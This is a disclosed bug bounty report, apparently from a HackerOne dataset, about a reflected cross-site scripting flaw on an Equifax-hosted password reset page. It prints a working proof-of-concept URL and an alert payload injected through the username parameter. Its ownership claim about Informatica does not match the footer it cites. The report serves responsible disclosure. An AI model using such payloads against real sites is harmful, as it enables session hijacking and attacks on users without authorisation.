---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '1463638'
original_report_id: '1463638'
title: RXSS on https://equifax.gr8people.com on Password Reset page in the username
  parameter
weakness: Cross-site Scripting (XSS) - Reflected
team_handle: equifax
created_at: '2022-01-28T23:48:12.696Z'
disclosed_at: '2022-03-09T17:15:26.045Z'
has_bounty: false
visibility: full
substate: resolved
vote_count: 6
asset_identifier: www.equifax.com
asset_type: URL
max_severity: critical
tags:
- hackerone
- cross-site-scripting-xss-reflected
---

# RXSS on https://equifax.gr8people.com on Password Reset page in the username parameter

## Metadata

- HackerOne Report ID: 1463638
- Weakness: Cross-site Scripting (XSS) - Reflected
- Program: equifax
- Disclosed At: 2022-03-09T17:15:26.045Z
- Has Bounty: No
- Visibility: full
- Substate: resolved

## Original Report

Hello,

While testing your program i came across a website that is owned by informatica and is vulnerable to RXSS on Password Reset page in the username parameter

POC:
https://equifax.gr8people.com/index.gp?method=cappportal.showPortalValidateChangePasswordCode&username=%27%22%3E%3Cimg%20src=x%20onerror=alert(1)%3E

Payload:'"><img src=x onerror=alert(1)>

works both on firefox and chrome.

firefox.png and chrome.png

Note that we can observe that the domain belongs to informatica by the footer of the page "© 2019 Equifax, Inc. All rights reserved."

regards
miguel santareno

## Impact

Attackers can execute scripts in a victim’s browser to hijack user sessions, deface web sites, insert hostile content, redirect users, hijack the user’s browser using malware, etc.

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
